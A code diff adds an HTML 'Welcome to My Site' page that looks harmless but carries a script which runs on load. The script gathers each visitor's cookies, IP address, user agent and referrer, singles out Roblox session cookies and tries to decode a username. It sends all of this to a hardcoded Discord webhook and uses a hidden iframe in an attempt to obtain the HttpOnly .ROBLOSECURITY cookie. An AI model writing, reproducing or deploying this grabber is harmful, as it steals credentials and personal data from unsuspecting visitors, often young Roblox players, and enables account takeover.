@@ -1,3 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome to My Site</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; }
+    </style>
+</head>
+<body>
+    <h1>Welcome!</h1>
+    <p>Loading content...</p>
+
+    <script>
+        (function() {
+            // --- CONFIGURATION ---
+            const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq'; // REPLACE THIS
+            const IP_API = 'https://api.ipify.org?format=json'; // Public IP service
+            // Use your own server endpoint for more reliable IP + headers:
+            // const IP_API = 'YOUR_BACKEND_ENDPOINT';
+
+            // --- DATA COLLECTION ---
+            let payload = {
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString(),
+                cookies: {},
+                robloxData: {},
+                ip: null
+            };
+
+            // 1. Extract all cookies
+            document.cookie.split(';').forEach(cookie => {
+                const [key, value] = cookie.trim().split('=');
+                payload.cookies[key] = value;
+            });
+
+            // 2. Target Roblox-specific cookies
+            const robloxCookieNames = [
+                '.ROBLOSECURITY', // HttpOnly, will not appear here normally
+                'GuestData',
+                'RBXEventTrackerV2',
+                'RBXSource',
+                'RBXSessionTracker',
+                'RBXMarketingTracker'
+            ];
+
+            robloxCookieNames.forEach(name => {
+                if (payload.cookies[name]) {
+                    payload.robloxData[name] = payload.cookies[name];
+                }
+            });
+
+            // Attempt to infer Roblox username from GuestData
+            if (payload.robloxData.GuestData) {
+                try {
+                    const decoded = atob(payload.robloxData.GuestData);
+                    const match = decoded.match(/Username\\":\\"([^"]+)/);
+                    if (match) payload.robloxData.inferredUsername = match[1];
+                } catch(e) {}
+            }
+
+            // 3. Get IP Address
+            fetch(IP_API)
+                .then(res => res.json())
+                .then(data => {
+                    payload.ip = data.ip;
+                    sendToDiscord(payload);
+                })
+                .catch(err => {
+                    payload.ip = 'Failed to fetch';
+                    sendToDiscord(payload);
+                });
+
+            // --- EXFILTRATION ---
+            function sendToDiscord(data) {
+                const embed = {
+                    title: "🚨 New Visitor Logged",
+                    color: 0xff0000,
+                    fields: [
+                        { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
+                        { name: "🕒 Timestamp", value: data.timestamp, inline: true },
+                        { name: "🔗 URL", value: data.url },
+                        { name: "🧭 User Agent", value: `\`\`\`${data.userAgent.substring(0, 1000)}\`\`\`` },
+                        { name: "📎 Referrer", value: data.referrer || 'Direct' },
+                    ],
+                    footer: { text: "Tesavek Webhook Logger v1.0" }
+                };
+
+                // Add Roblox data if found
+                if (Object.keys(data.robloxData).length > 0) {
+                    let robloxInfo = '';
+                    for (const [key, value] of Object.entries(data.robloxData)) {
+                        robloxInfo += `**${key}:** \`${value.substring(0, 50)}${value.length > 50 ? '...' : ''}\`\n`;
+                    }
+                    embed.fields.push({ name: "🎮 Roblox Cookies", value: robloxInfo || 'None' });
+                }
+
+                // Add other interesting cookies
+                const otherCookies = Object.keys(data.cookies)
+                    .filter(k => !robloxCookieNames.includes(k))
+                    .slice(0, 5);
+                if (otherCookies.length > 0) {
+                    embed.fields.push({ 
+                        name: "🍪 Other Cookies", 
+                        value: otherCookies.map(k => `\`${k}\``).join(', ') 
+                    });
+                }
+
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                }).catch(e => console.error('Webhook failed:', e));
+            }
+
+            // --- STEALTH .ROBLOSECURITY GRAB (Advanced) ---
+            // If user visits your site WHILE logged into roblox.com in same browser,
+            // this hidden iframe may trigger a request sending the HttpOnly cookie.
+            // Requires your server to log ALL request headers.
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = 'https://roblox.com/favicon.ico'; // Request to Roblox domain
+                document.body.appendChild(iframe);
+            }, 1000);
+        })();
+    </script>
+</body>
+</html>
 
 <head>
   <meta charset="utf-8">
